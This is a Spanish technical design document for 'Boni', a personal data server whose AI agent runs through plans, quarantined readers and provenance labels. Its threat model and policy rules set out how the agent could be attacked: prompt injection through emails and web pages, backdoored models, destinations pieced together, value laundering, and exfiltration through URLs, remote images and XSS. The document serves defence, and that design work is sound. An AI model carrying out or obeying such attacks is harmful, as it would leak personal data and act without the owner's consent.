# Núcleo de Boni: diseño técnico

**Estado: APROBADO por Juan el 2026-10-19** ("apruebo el diseño"), después de la revisión adversarial de la sección 16.
Lo marcado como Propuesto dentro del documento se aplica con el diseño; lo Abierto se decide en el PR que lo necesite.
El plan de producto y su motivación están en el vault (`proyectos/boni-plan.md`, secciones 0, 3 y 9); este documento es
el diseño técnico que lo concreta. Cada punto lleva su estado: **Decidido** (por Juan, con fecha), **Propuesto** (por la
IA, pendiente) o **Abierto**. Lo que no se ha comprobado lleva `UNVERIFIED`.

Este repo pasará a llamarse `boni` (decisión de Juan, 2026-10-19), así que las rutas de abajo son las del monorepo.

---

## 0. Resumen

- **Un solo servidor (Boni server), una sola cuenta y varias apps.** Habrá cinco: Boni y Boni Calendar, cada una en
  móvil y en escritorio, más el servidor. El calendario pasa a ser un módulo del núcleo.
- **Entidades con tipo, propiedades y relaciones** en un SQLite por usuario. Cada campo guarda su **procedencia**: de
  dónde viene y lo sensible que es. Las etiquetas las pone el código y se heredan.
- **El agente no ejecuta lo que el modelo dice.** El modelo produce un **plan** en un lenguaje JSON pequeño y cerrado, y
  un **intérprete** lo ejecuta paso a paso. Cada llamada pasa por un **motor de políticas** en lista blanca, que falla en
  cerrado.
- **El planificador nunca ve contenido externo.** Los correos, las webs y las transcripciones los leen **lectores en
  cuarentena** (modelos sin herramientas, con salida de esquema fijo). Lo que devuelven sigue etiquetado como externo.
- **Lo que el código no puede garantizar lo decide una persona.** Las confirmaciones se pintan desde los argumentos
  reales. Lo que se deriva de contenido externo va a una **bandeja de propuestas**. Todo lo reversible se puede deshacer.
- **Revisado como lo haría un atacante** (sección 16): 21 ataques, 6 de gravedad alta corregidos en el diseño (destinos
  armados a trozos, elecciones que lavan valores, flujos implícitos, XSS, salidas por el espejo, rendijas hacia el
  planificador).
- **Las pruebas suponen un modelo totalmente comprometido** (planificador y lectores maliciosos). Así el corpus de
  inyecciones del CI es determinista y falla si una política cede.
- **La transición no rompe nada.** El servidor nuevo habla las dos API actuales (`/api/*` del calendario y `/api/v1/*`
  de Boni). Las colecciones pasan del vault al núcleo una a una, y la agenda la última.

## 1. Decisiones de partida

| Tema | Estado |
|---|---|
| Sin Hermes; agente propio; robusto por defecto, sin configuración obligatoria; UX de mínima carga | Decidido (Juan, 2026-10-19) |
| Núcleo en TypeScript | Decidido (Juan, 2026-10-19) |
| Un servidor, una cuenta, el calendario como módulo; el núcleo pasa a ser la verdad y el vault, importación y espejo | Decidido (Juan, 2026-10-19) |
| Empezar por el núcleo de datos + conversación que crea tipos y vistas, con el vault como primera importación | Decidido (Juan, 2026-10-19) |
| **Monorepo:** `boni-calendar` pasa a llamarse `boni`; el repo `boni` actual pasa a `boni-pruebas` y se archiva; lo útil de él entra con su historial | Decidido (Juan, 2026-10-19) |
| **Exposición:** todo por tailnet; por Funnel solo una lista blanca de rutas (login y las del calendario que hoy son públicas) | Decidido (Juan, 2026-10-19) |
| **Obsidian:** espejo Markdown de solo lectura; una edición a mano del espejo se convierte en propuesta; el plugin pasa a ser cliente del núcleo; migración colección a colección, la agenda la última | Decidido (Juan, 2026-10-19) |
| **El modelo puede leer y modificar el contenido de las notas**, como Claude con el vault. La seguridad la da la arquitectura, no esconderle los datos al proveedor. Matiza "las notas propias no deben salir" (plan, sección 1) para la fase del NAS | Decidido (Juan, 2026-10-19) |
| Cada app (Boni y Boni Calendar, en móvil y escritorio) se sigue publicando por separado desde el mismo repo | Decidido (Juan, 2026-10-19) |
| **Contenido externo = texto escrito por otros** (no una carpeta); `NotionImport/` son notas de Juan | Decidido (Juan, 2026-10-19) |

Consecuencia de la última fila de privacidad: en el NAS, el proveedor del modelo (Anthropic) recibe el texto que el
agente necesita. Lo que el diseño impide es que ese texto **salga hacia terceros** (un correo enviado, una URL, una
búsqueda) o que el contenido externo **dé órdenes**. Para el producto alojado se conserva el gancho del router de
modelos por clase de privacidad (sección 7.10), que hoy no restringe nada.

## 2. Modelo de amenazas

**Qué protegemos**
1. **La integridad de las acciones:** nada se envía, paga, borra o publica sin que Juan lo quiera, y nada se escribe por
   orden de un contenido externo sin pasar por la bandeja.
2. **La confidencialidad frente a terceros:** ningún dato personal o sensible sale hacia internet (envío, URL, búsqueda,
   imagen remota) salvo con una confirmación pintada desde los argumentos reales. Leer el modelo (el proveedor) no
   cuenta como salida: está aceptado.
3. **La memoria y el esquema:** el contenido externo no puede plantar instrucciones en la memoria del agente, ni crear
   tipos, vistas o tareas programadas por su cuenta.

**Quién ataca**
- **Autores de contenido externo:** correos, webs, invitaciones `.ics`, calendarios suscritos y, en el futuro,
  solicitudes de investigación (sección 6 del plan). Es la inyección de prompt clásica.
- **El propio modelo**, por una puerta trasera del entrenamiento que un disparador activa, o simplemente por un error.
  Se supone que **cualquier salida de un modelo puede ser maliciosa**, también la del planificador y aunque solo haya
  visto la petición de Juan.
- **Otros agentes que escriben en el vault** (Hermes editor, Claude por vault-mcp) cuyo contenido llega por la
  importación: el vault como bus de propagación (plan, sección 7).
- **Una sesión robada o un dispositivo compartido** (TV, altavoz).
- Más adelante, en el producto alojado, **el operador** (sección 5 del plan; fuera del alcance de este documento salvo
  los ganchos que dejamos).

**A qué ataca** (lo amplió la revisión adversarial de la sección 16)
- **Al planificador**, metiéndole texto por cualquier rendija que llegue a su contexto: datos, nombres del esquema,
  mensajes de error, el historial de la conversación, resultados de búsqueda.
- **A las reglas**, construyendo con piezas permitidas lo que una regla prohíbe: un destino armado a trozos, una
  elección de Juan que lava un valor, una condición externa que decide si se actúa.
- **A Juan**, engañándole: una confirmación que parece inocente, un mensaje que pide la contraseña, cincuenta propuestas
  para que las acepte de golpe.
- **A la interfaz**: HTML o scripts de un correo que se ejecutan con su sesión (XSS), o imágenes remotas que se cargan
  solas y avisan al atacante.
- **A la cadena de suministro**: dependencias, descripciones de herramientas de terceros, la API del modelo.
- **Al bolsillo**: inundar de correos para disparar el gasto en llamadas al modelo.

**Qué no cubre**
- Un fallo del propio servidor (Node, SQLite, nuestro código) explotado desde la red. Se mitiga con poca superficie, la
  lista blanca de Funnel, contenedores endurecidos y la imagen al día.
- Que el modelo dé una **respuesta equivocada o engañosa** sobre datos propios cuando no hay acción. Se mitiga con
  respuestas sobre datos calculadas por el código siempre que se pueda (sección 7.2), no con el modelo.

**Corolario de diseño:** una regla es de seguridad solo si la impone el código. El prompt del sistema ayuda a la
utilidad, nunca a la seguridad.

## 3. Vista general

```
 Boni (web, Electron, Android)     Boni Calendar (web, Electron, Android, plugin de Obsidian)
          \                                   /
           \   HTTPS + JSON + SSE (sesión por dispositivo)
            v                                v
   ┌─────────────────────────── Boni server (un proceso Node 24) ───────────────────────────┐
   │ listener tailnet (todo)          listener público (lista blanca, falla en cerrado)     │
   │                                                                                        │
   │ identity   ── system.db (cuentas, dispositivos, sesiones, claves envueltas)            │
   │ store      ── users/<id>/boni.db (entidades, esquema, vistas, registro, bandeja…)      │
   │ entities · views · calendar (módulo) · capture/charts (compat. /api/v1)                │
   │ agent: planner ─▶ plan ─▶ interpreter ─▶ policy ─▶ tools ;  readers (cuarentena)       │
   │ scheduler (trabajos declarativos) · connectors (vault, iCal, correo después) · models  │
   └────────────────────────────────────────────────────────────────────────────────────────┘
            │                         │                               │
     vault (importación/espejo)   proveedores de modelos         internet solo vía netSafety
```

**Monorepo (propuesto)**

```
packages/
  calendar/    antes packages/core (tiempo, colecciones, proyección, series, iCal, avisos) → @boni/calendar (hecho, PR 54)
  entities/    tipos, campos, valores, etiquetas de procedencia, operaciones de esquema (puro, sin E/S)
  store/       SQLite por usuario: migraciones, entidades, enlaces, FTS, registro de operaciones, deshacer, claves
  views/       ViewSpec, compilador de consultas, motor de gráficas (puerto del de Boni), formularios
  agent/       lenguaje de planes, intérprete, políticas, registro de herramientas, bandeja, lectores, modelos
  net/         netSafety (descargas seguras, compartido por iCal, web y lo que venga)
apps/
  server/      el Boni server (arranca del actual servidor del calendario)
  calendar-web/  calendar-desktop/  calendar-android/  obsidian-plugin/   (el calendario de hoy, renombrado)
  boni-web/      boni-desktop/      boni-android/                         (Boni: conversación, vistas, captura)
legacy/boni/   el repo boni archivado, con historial (servidor Python y clientes); se borra pieza a pieza al portarla
```

Cada app tiene su workflow, que se lanza solo cuando cambian sus carpetas o los paquetes de los que depende. Cada una
publica con su propio prefijo de etiqueta (`boni-android-v…`, `calendar-android-v…`, `boni-desktop-v…`,
`calendar-desktop-v…`). La imagen del servidor se construye en el NAS como hoy.

## 4. Modelo de entidades

### 4.1 Tipos, campos y entidades

```ts
type FieldType =
  | "text" | "longtext"            // longtext = Markdown
  | "number" | "money"             // money = { amount, currency }
  | "select" | "multiselect" | "checkbox"
  | "date" | "time" | "datetime" | "dates" | "duration"
  | "url" | "email" | "phone"
  | "relation"                     // a otra entidad (target, cardinalidad, campo inverso)
  | "file";                        // adjunto por hash, nunca una URL

interface FieldDef {
  id: string;            // estable para siempre ("f_8k2…"); los valores se guardan por id
  key: string;           // ASCII, para exportar y para el agente ("autor"); se puede renombrar
  name: string;          // lo que ve Juan ("Autor")
  type: FieldType;
  options?: SelectOption[];
  relation?: { target: TypeId; many: boolean; inverse?: FieldId };
  sensitivity?: Sensitivity;  // mínimo para sus valores (p. ej. importe = sensible)
  hidden?: boolean;           // claves importadas que no se muestran pero se conservan
}

interface TypeDef {
  id: TypeId; key: string; name: string; icon?: string;
  fields: FieldDef[];
  titleField: FieldId;
  sensitivity: Sensitivity;     // por defecto del tipo (movimiento = sensible, persona = personal)
  thirdParty?: boolean;         // describe a otras personas (personas, remitentes): nunca en informes cedidos
  schemaVersion: number;        // sube con cada cambio de esquema
  label: Label;                 // procedencia del propio tipo (quién lo creó y a partir de qué)
  archived?: boolean;
}

interface Entity {
  id: EntityId;                 // ULID: no depende del nombre ni de la ruta
  type: TypeId;
  values: Record<FieldId, Value>;
  body?: string;                // texto libre (Markdown), como el cuerpo de una nota
  created: number; updated: number;
  version: number;              // sube con cada cambio (concurrencia optimista)
  deleted?: number;             // papelera: se puede deshacer
}
```

- **Semilla:** es la generalización de `Collection`, `Column` y `Row` de `packages/calendar`. `ColumnType` se queda
  dentro de `FieldType`; un `CalendarView` con su mapeo pasa a ser una vista de calendario sobre un tipo (sección 10).
- **Relaciones:** tabla `links (from, field, to, pos)`, en los dos sentidos y consultable. Los `[[enlaces]]` del cuerpo
  se guardan como enlaces de clase `mention`, sin campo. Borrar una entidad no borra las relacionadas: deja el enlace
  roto visible en la sección "Datos".
- **Sin carpetas como almacén.** Una jerarquía (proyectos y subproyectos) es una relación `parent` y una vista de árbol.
- **Sistema frente a usuario:** Boni trae unos tipos de sistema con ids fijos (`memory`, `proposal`, `job`, `miniapp`,
  `view`). El agente no puede modificar su esquema. Todo lo demás (evento, tarea, movimiento, persona, libro…) son tipos
  de usuario, aunque los cree la importación.

### 4.2 Procedencia: etiquetas por entidad y por campo

```ts
type Integrity =
  | "user"      // lo escribió o eligió Juan en un dispositivo personal, en este turno o al editar a mano
  | "own"       // calculado por el código de Boni a partir de datos con integridad >= imported
  | "imported"  // importado del vault desde una carpeta de confianza (sección 9.1)
  | "ambient"   // voz ambiental, dispositivo compartido
  | "model"     // generado por un modelo cuyas entradas tenían integridad >= imported
  | "external"; // de fuera (correo, web, .ics, carpetas no fiables del vault) o derivado de ello

type Sensitivity = "public" | "personal" | "sensitive";   // "fuera de alcance" no llega nunca a Boni

interface Label {
  integrity: Integrity;
  sensitivity: Sensitivity;
  thirdParty: boolean;
  sources: SourceRef[];   // p. ej. { kind: "mail", id }, { kind: "vault", path, sha256 }, { kind: "turn", id }
}
```

- **Las etiquetas las pone el código, nunca el modelo**, y **se heredan**: combinar valores da la integridad más baja y
  la sensibilidad más alta, y une las fuentes. Un resumen de un correo sigue siendo `external`. Una tarea que Juan crea a
  mano tomando el título de un correo es `external` en ese campo, aunque la entidad la haya creado él.
- **Orden de integridad:** `user > own > imported > ambient > model > external`.
- **Procedencia por campo:** la tabla `field_prov (entity, field, integrity, sensitivity, third_party, sources,
  op_id)` guarda la etiqueta del último valor escrito en cada campo. La etiqueta de la entidad es la combinación de las
  de sus campos y su cuerpo.
- **Aceptar una propuesta no lava la etiqueta.** El valor que viene de un correo sigue siendo `external` después de que
  Juan pulse "Aceptar". Lo que cambia es que la acción queda autorizada. Juan sí puede **reescribir** un campo a mano, y
  entonces pasa a `user`.
- **La sensibilidad solo sube sola.** El agente y la importación pueden subirla; bajarla es un ajuste de Juan con
  confirmación.
- **El esquema también lleva etiqueta.** Los nombres de tipos, campos y opciones son texto que el planificador ve. Si un
  nombre nace de contenido externo (una opción "proyecto X" sacada de un correo y aceptada), conserva su etiqueta, y el
  planificador ve solo su id.
- **Valores derivados.** Todo valor que sale de una función del plan (`concat`, `pick`, formatear…) lleva la marca
  `derived` además de su etiqueta. Un argumento con papel de destino (`destination`, `url`, `path`, `recipient`) solo
  acepta valores **sin derivar**: una cita completa de la petición de Juan o el valor tal cual de un campo de una
  entidad de confianza (P2). Así no se puede armar una dirección a trozos con letras citadas de la petición.
- **Etiqueta de control.** Un paso que solo se ejecuta por una condición (`when`) o una iteración (`each`) que dependen
  de datos externos hereda esa etiqueta, aunque sus argumentos sean de confianza. Si un correo decide *que* se actúa,
  la acción cuenta como derivada del correo (P15). Es el flujo implícito de la teoría de control de información, el
  hueco que CaMeL deja abierto si no se cuida.
- **Lo que Juan elige no lava nada.** En un paso `ask`, lo que Juan *escribe* es `user`. Si elige una opción, el valor
  conserva la etiqueta que tenía la opción: si la puso el planificador, es `model`. Lo que es de Juan es la elección, no
  el contenido. Un `ask` nunca sustituye a una confirmación (P5): esas solo las pinta el código.

### 4.3 Evolución del esquema

- Los cambios de esquema son **operaciones del mismo registro** que los datos (sección 7.7), así que se registran, se
  deshacen y pasan por las políticas: `create_type`, `add_field`, `rename_field` (cambia `key` y `name`; el id no),
  `change_field_type` (con vista previa de la conversión; los valores anteriores quedan en el registro),
  `archive_field` (se oculta y los datos se conservan; borrarlos de verdad es otra operación, irreversible y con
  confirmación), `create_relation`, `merge_types` (más adelante).
- **Quién lo cambia:** si Juan lo pide en el turno ("quiero llevar control de los libros que leo"), el agente crea el
  tipo, una vista y un atajo, y lo cuenta ("He creado Libros con título, autor, estado…" y un botón Deshacer). Si nace de
  contenido externo o de la jardinería periódica (duplicados, campos sin uso), va a la bandeja como propuesta.
- **Las vistas, los atajos y los trabajos referencian campos por id**, así que renombrar no rompe nada. Cada tipo lleva
  `schemaVersion`, y la exportación incluye el esquema.
- **Tablas de sistema:** el esquema SQL de Boni avanza con migraciones numeradas, como hoy en `db.ts` (`user_version`).
  Nunca hay DDL generado por el agente: los tipos de usuario son datos, no tablas.

## 5. Almacén

### 5.1 Dos niveles
- **`system.db`** (uno por servidor): cuentas, credenciales, dispositivos, sesiones, direcciones de UnifiedPush y la
  clave de datos de cada usuario envuelta. Nada de sus datos.
- **`users/<id>/boni.db`** (uno por usuario): tipos y campos, entidades, enlaces, `field_prov`, índice de texto
  (FTS5), vistas y páginas, atajos y mini-apps, registro de operaciones, ejecuciones del agente, bandeja, memoria,
  trabajos programados, estado de los conectores (cursores, secretos cifrados) y el índice de adjuntos. Los adjuntos van
  en `users/<id>/files/<sha256>`, cifrados.

```sql
CREATE TABLE types    (id TEXT PRIMARY KEY, def TEXT NOT NULL, updated INTEGER NOT NULL);
CREATE TABLE entities (id TEXT PRIMARY KEY, type TEXT NOT NULL, vals TEXT NOT NULL, body TEXT,
                       created INTEGER NOT NULL, updated INTEGER NOT NULL, version INTEGER NOT NULL, deleted INTEGER);
CREATE TABLE links    (src TEXT NOT NULL, field TEXT, dst TEXT NOT NULL, pos INTEGER, kind TEXT NOT NULL);
CREATE TABLE field_prov (entity TEXT NOT NULL, field TEXT NOT NULL, label TEXT NOT NULL, op INTEGER NOT NULL,
                       PRIMARY KEY (entity, field));
CREATE TABLE ops      (seq INTEGER PRIMARY KEY, at INTEGER NOT NULL, actor TEXT NOT NULL, run TEXT, device TEXT,
                       kind TEXT NOT NULL, target TEXT NOT NULL, before TEXT, after TEXT, label TEXT NOT NULL,
                       undoes INTEGER);
CREATE VIRTUAL TABLE entities_fts USING fts5(title, text, content='');
-- y además: views, pages, shortcuts, runs, run_steps, proposals, jobs, connector_state, files, vault_map
```

- **Valores en JSON por id de campo** (`vals`) e **índices por expresión** sobre los campos que se consultan mucho,
  creados por el código, nunca por el agente (`CREATE INDEX … ON entities(json_extract(vals,'$.f_x')) WHERE type = …`).
  Comprobado en este portátil: Node 24.21 trae SQLite 3.53.4 con JSON y FTS5. Con miles de entidades por tipo basta; si
  algún tipo llegara a cientos de miles, se valora una tabla física para él (abierto, sin caso real).
- **`node:sqlite`** (sin módulos nativos, como el servidor actual). Se usan `enableDefensive(true)` y `setAuthorizer`:
  las consultas que compila el motor de vistas se ejecutan con un autorizador que solo permite `SELECT` sobre las
  tablas permitidas. Es una defensa más, además de compilar desde una especificación cerrada.
- **Un escritor por usuario:** cada operación es una transacción, con un mutex por usuario y WAL.
- **Versiones para los clientes:** un contador monótono por usuario, que parte del reloj al arrancar como hoy. Así
  `changes since` sale del registro de operaciones y el flujo SSE avisa.

### 5.2 Cifrado por usuario (pensando en el producto alojado)
- **Interfaz desde el primer día:** `KeyProvider.open(userId) → DataKey` y `openUserStore(userId, key)`.
  - **En el NAS:** cada usuario tiene una clave de datos aleatoria de 32 bytes, envuelta (AES-256-GCM) con la clave
    maestra del servidor (`secret.key`, como hoy).
  - **En el producto alojado:** la clave la entrega un KMS tras la atestación del entorno, o la desenvuelve el
    dispositivo del usuario (sección 5 del plan).
- **Ya cifrado a nivel de aplicación:** los secretos de los conectores (como hoy las direcciones iCal), los adjuntos y
  las copias de seguridad (cada copia `VACUUM INTO` se cifra en flujo con la clave de datos).
- **Cifrado de páginas de la base de datos: abierto, con una prueba técnica antes del producto alojado.** `node:sqlite`
  no trae SQLCipher, y una extensión cargable no puede añadir el códec de páginas (UNVERIFIED). Las opciones son
  `better-sqlite3-multiple-ciphers` (módulo nativo, rompe la regla de no usar módulos nativos), un Node con SQLite
  propio, o el cifrado del disco del entorno confidencial. En el NAS no aporta mucho, porque la clave vive en el mismo
  servidor. Propuesta: dejar la interfaz y medir las opciones en el Celeron cuando toque.
- **Sin rutas de administrador que lean datos.** La CLI de administración solo toca `system.db` (crear cuentas, revocar
  sesiones). No existe "entrar como el usuario".

## 6. Cuenta única y sesiones por dispositivo

- **Tablas (system.db):** `accounts (id, name, pass, created, disabled)`; `devices (id, account, name, kind, trust,
  created, last_seen)`, con `kind` ∈ phone/desktop/browser/tv/watch/speaker y `trust` ∈ personal/shared/ambient;
  `sessions (token_hash, device, created, last_seen, listener)`; `push (session, endpoint)`.
- **Inicio de sesión igual que hoy en las dos apps** (`POST /api/login {user, password, device}` y su equivalente en
  `/api/v1/login`). Nada de registro abierto. Tampoco cambian la regla de 90 días sin uso ni los límites de intentos
  (`limits.ts`, igual en las dos implementaciones).
- **Confianza del dispositivo:** se fija al crear la sesión.
  - **Personal** por defecto para escritorio, móvil y navegador por tailnet.
  - **Compartido** para TV y navegador por Funnel.
  - **Ambiental** para altavoz.
  - Subir un dispositivo a personal se confirma desde otro dispositivo personal. Las confirmaciones sensibles solo se
    aceptan desde un dispositivo personal (sección 7.5).
- **Novedad:** revocar un solo dispositivo (hoy solo se pueden cerrar todas las sesiones de un usuario).
- **Migración de las dos bases actuales.** Comprobado en el código: los dos servidores usan scrypt con N=16384, r=8,
  p=1, 32 bytes y el formato `scrypt$sal$hash` en base64; los dos guardan el sha256 en hexadecimal del token de sesión.
  Se pueden **migrar las sesiones tal cual**, sin pedir login otra vez. La herramienta `boni admin import-accounts
  --dry-run`:
  - une `juan` de `boni-calendar.db` y `juan` de `boni.sqlite3` en una cuenta, quedándose con la contraseña del
    calendario (Juan elige si prefiere la otra);
  - copia las sesiones, con dispositivo y última vez visto (Boni guarda `last_seen` en segundos y el calendario en
    milisegundos);
  - pasa los datos de cuenta del calendario (preferencias y calendarios externos, descifrados y vueltos a cifrar con
    la clave del usuario);
  - pasa lo de Boni: gráficas, atajos, widgets por dispositivo y preferencias. Hoy son globales en `boni.sqlite3`, no
    por usuario; con una sola cuenta da igual, pero se asignan a `juan`.
  - Antes de escribir nada imprime el informe.

## 7. Motor del agente

### 7.1 Flujo de una petición
```
turno de Juan (dispositivo, confianza)
   │
   ▼
planificador (modelo) ── ve: la petición, el esquema, el catálogo de herramientas, datos de confianza
   │                     no ve: nada con integridad external (solo asas opacas: "$v3: 5 correos, externo")
   ▼
plan (JSON, versión N) ─▶ validador (esquema + límites + herramientas existentes)
   ▼
intérprete ─ paso a paso ─▶ política(llamada, etiquetas, contexto) ─▶ allow | deny | confirm | propose
   │                                                 │
   │◀──── resultados etiquetados ◀── herramienta ◀───┘ (allow, o confirm aceptado)
   │◀──── lector en cuarentena (sin herramientas, esquema fijo) para el contenido no fiable
   ▼
respuesta pintada por el código (plantillas y componentes del catálogo) + registro + deshacer
```
Si hace falta replanificar (por ejemplo, tras una pregunta a Juan), el planificador vuelve a recibir solo lo que es de
confianza.

### 7.2 Lenguaje de planes
JSON validado con esquema (`version: 1`). Es **plano**: una lista de pasos sin anidar, porque así encaja con las
salidas estructuradas sin depender de esquemas recursivos (soporte de `$ref` recursivo UNVERIFIED) y se audita mejor.

```ts
interface Plan { version: 1; steps: Step[]; }   // máximo 40 pasos; con `each`, máximo 50 iteraciones por paso

type Step = { id: string; when?: Expr; each?: Ref } & (
  | { op: "call";  tool: ToolName; args: Record<string, Expr> }
  | { op: "read";  reader: ReaderKind; input: Expr; params?: Record<string, Expr> }
  | { op: "ask";   control: AskControl; prompt: Expr; options?: Expr }    // controles del catálogo
  | { op: "reply"; component: ReplyComponent; data: Record<string, Expr> } // texto con huecos, tabla, cifra, gráfica…
);

type Expr =
  | { lit: string | number | boolean | null }  // literal del planificador → integridad "model"
  | { quote: string }                          // cita literal de la petición: el intérprete comprueba que aparece
                                               // tal cual en el turno de Juan → integridad "user"
  | { ref: string }                            // "$s2", "$s2.items[0].f_titulo", "$item"
  | { fn: PureFn; args: Expr[] };              // count, sum, min, max, filter, map, pick, concat, date math…
```

- **Sin código libre**, sin bucles sin límite, sin recursión. Una herramienta que no está en el registro hace el plan
  inválido. Las funciones puras son una lista cerrada y propagan etiquetas.
- **Las respuestas sobre datos las calcula el código.** "¿Cuánto gasté en comida este mes?" se planifica como
  `call entities.aggregate` y luego `reply number`: la cifra no pasa por el modelo, así que no puede inventarla.
- **Por qué `quote`:** un planificador con puerta trasera puede inventarse un destinatario. Un literal suyo nunca vale
  como destino; una cita de la petición de Juan sí (regla P2 de la tabla de 7.5). La cita tiene que ser un tramo
  completo de la petición, entre separadores, y de un mínimo de 3 caracteres. Como destino solo vale tal cual, nunca
  pasada por una función (sección 4.2, valores derivados).
- **Un plan es para un turno.** Su validez se ata al id del turno y a un hash de la petición. Un plan guardado, una
  plantilla de trabajo o una mini-app no puede citar una petición que no es la suya.

### 7.3 Planificador
- **Entrada:**
  - un prompt de sistema fijo y versionado en el repo;
  - el catálogo de herramientas (nombre, argumentos con su esquema, clase de efecto), diferido como se explica en 7.11;
  - el esquema de los tipos de Juan;
  - la conversación, con los turnos de Juan y los resultados de confianza;
  - los datos propios que haga falta (decisión de Juan: el modelo puede leer las notas).
- **Lo que no recibe:** nada con integridad `external` ni `ambient` sin confirmar. En su lugar recibe **asas opacas**
  con la forma del valor ("lista de 5 tareas, externo, campos: título, fecha"). Tampoco recibe secretos ni tokens.
- **Una sola frontera hacia el planificador.** Todo lo que entra en su contexto pasa por una única función,
  `toPlannerView(value)`, con pruebas propias. Cambia por asas lo que no puede ver, vaya donde vaya:
  - **resultados de herramientas y búsquedas:** un fragmento de FTS de una entidad externa es externo;
  - **nombres del esquema** (4.2);
  - **mensajes de error:** los redacta el código con códigos fijos y nunca citan datos. Un error de lectura de un `.ics`
    no puede traer su `DESCRIPTION`;
  - **historial de la conversación:** se guarda estructurado, con las respuestas como componentes y asas, nunca como el
    texto pintado para Juan. Lo que Juan vio de un correo no vuelve al planificador en el turno siguiente;
  - **memoria** (7.13).
- **Salida:** el plan como salida estructurada (`output_config.format` con el esquema del plan; en TS,
  `client.messages.parse()`). **No se le da ninguna herramienta en la API.** El modelo nunca llama a nada: solo
  describe un plan. Si el plan es inválido, se reintenta una vez con el error y después se para.

### 7.4 Lectores en cuarentena
- **Un modelo sin herramientas**, con un prompt de sistema fijo por tipo de lector, el contenido no fiable y un
  **esquema de salida fijo** (salida estructurada). El código vuelve a validar la salida: tipos, longitudes máximas,
  valores enumerados, fechas que se pueden leer, sin enlaces ni HTML en el texto.
- **Tipos iniciales:**
  - `extract_tasks(correo) → [{título, fecha_límite?, remitente, id_mensaje}]`;
  - `classify(texto, opciones) → enumerado`;
  - `summarize(texto) → texto`;
  - `rewrite(texto, instrucción del plan) → texto`;
  - `answer_about(texto, pregunta) → texto`.
- **La etiqueta de la salida es la de la entrada.** Lo que sale de un correo es `external`; leer una nota propia da
  `model`, que el planificador sí puede ver pero que nunca vale como destino.
- **A un lector no se le pasan datos propios junto al contenido externo.** Por ejemplo, para clasificar un correo en un
  proyecto, la lista de proyectos se pasa solo como valores enumerados permitidos, y lo que vuelve se valida contra esa
  lista. Así un correo malicioso no puede convertir al lector en un canal para sacar datos. **Lo impone el intérprete**,
  no el prompt: rechaza un paso `read` que mezcle una entrada `external` con datos `personal` o `sensitive`, salvo como
  lista de opciones permitidas.
- **El contenido externo entra en el lector como datos.** Va delimitado, con un marcador aleatorio por llamada que el
  código comprueba que no aparece dentro del propio contenido, y el lector solo puede responder con su esquema. Esto no
  es una defensa (la defensa es que el lector no tiene herramientas y su salida sigue siendo externa); solo mejora la
  calidad de la extracción.
- **Un lector no puede pedir nada.** No hay `need_tools`, no puede replanificar y no puede llamar a otro lector. Si el
  contenido dice "consulta también este enlace", eso sale como un campo más, externo.

### 7.5 Motor de políticas
Es una función pura: `decide(call, ctx) → allow | deny(motivo) | confirm(vista) | propose`.

- **Registro de herramientas en lista blanca.** Cada herramienta declara su clase de efecto (`read`, `write`,
  `write_irreversible`, `egress`, `send`, `schedule`, `schema`, `memory`) y el **papel de cada argumento**
  (`destination`, `url`, `path`, `recipient`, `query`, `content`, `entity`, `amount`…).
- **Falla en cerrado.** Una herramienta o un argumento sin clasificar no se registra: una prueba del CI lo comprueba y
  el servidor no arranca. Ante cualquier caso no previsto, `decide` devuelve `deny`.
- **La clase de efecto se impone con capacidades, no solo se declara.** Una etiqueta mal puesta por un programador
  dejaría pasar una herramienta. Por eso cada herramienta recibe solo los objetos que su clase permite:
  - una `read` recibe un almacén de solo lectura y ninguna red;
  - una `write` recibe el almacén con escritura, que registra cada operación con la etiqueta de sus argumentos;
  - solo una `egress` o `send` recibe un cliente de red, y solo el de `packages/net`.

  Una herramienta mal clasificada no consigue hacer lo que no declaró: falla al ejecutarse. Además, el almacén solo
  devuelve valores etiquetados, así que una herramienta no puede "olvidar" la etiqueta de lo que lee.
- **El contexto:** el origen del turno (dispositivo y su confianza, trabajo en segundo plano, mini-app), las etiquetas
  de cada argumento y el plan entero (para las reglas de secuencia).

**Reglas base (no se pueden configurar; Juan solo ajusta cuánto se entera):**

| Id | Situación | Decisión |
|---|---|---|
| P1 | Leer datos propios, borradores, escrituras reversibles pedidas por Juan en este turno | allow, registrado, con Deshacer |
| P2 | Un argumento `destination`, `url`, `path` o `recipient` con integridad `external`, `model` o `ambient` | deny siempre |
| P3 | `egress` o `send` con datos `personal`/`sensitive` | deny; confirm si esos datos tienen integridad `user` en este turno |
| P4 | Escritura con algún argumento `external` (una tarea sacada de un correo) | propose (bandeja, un toque) |
| P5 | `send`, pagar, borrar a petición del agente, `write_irreversible` | confirm siempre, pintada desde los argumentos reales y desde un dispositivo personal |
| P6 | Turno ambiental (TV, voz ambiental) o dispositivo compartido | solo `read` y propose; lo sensible se confirma en el móvil |
| P7 | Trabajo en segundo plano (sin turno de Juan) | solo `read` y propose; nunca `egress` (salvo la descarga propia de un conector, que hace código y no el agente) |
| P8 | `schedule` (crear o cambiar trabajos) | solo desde un turno de Juan, con confirm; nunca desde segundo plano ni desde contenido externo |
| P9 | `memory` con algún argumento `external` | deny (el contenido externo nunca escribe en la memoria) |
| P10 | `schema` | allow con aviso y Deshacer en un turno de Juan; propose si viene de contenido externo o de la jardinería; borrar datos de un campo, confirm |
| P11 | Secuencias sospechosas (muchas lecturas sensibles y luego `egress`; más de N escrituras en una ejecución) | la ejecución se para y pide confirm |
| P12 | Límites por ejecución: pasos, llamadas a modelos, bytes de salida, coste | deny al superarlos |
| P13 | Límites por día en segundo plano: llamadas a lectores por día y por remitente, coste diario | lo que pase del límite espera al día siguiente o a que Juan lo pida; avisa una vez |
| P14 | Un destino (`destination`, `url`, `path`, `recipient`) que es un valor derivado (4.2) | deny |
| P15 | Un paso cuya condición o iteración depende de datos externos (etiqueta de control, 4.2) | se trata como si sus argumentos fueran externos: propose, o la regla que toque |
| P16 | Crear o cambiar mini-apps, atajos o trabajos con algo externo en su especificación | deny (Juan puede crearlos a mano o pedirlos en un turno) |
| P17 | Escribir texto con integridad `model` o `external` que lleve recursos remotos (imágenes, iframes, `![](https://…)`) en un sitio que otro programa pinta (espejo del vault, notas) | se escribe neutralizado: el recurso pasa a texto plano |
| P18 | Un efecto indirecto: código de Boni que haría algo con un valor guardado (descargar una URL de un campo, suscribirse a un calendario) | solo si ese valor tiene integridad `user` y la acción es una herramienta `egress` declarada |

- **Las confirmaciones las pinta el código** con la plantilla de cada herramienta y los argumentos reales:
  destinatario, importe, texto completo. Muestran la procedencia ("este texto viene de un correo de X"). Nunca usan un
  resumen del modelo.
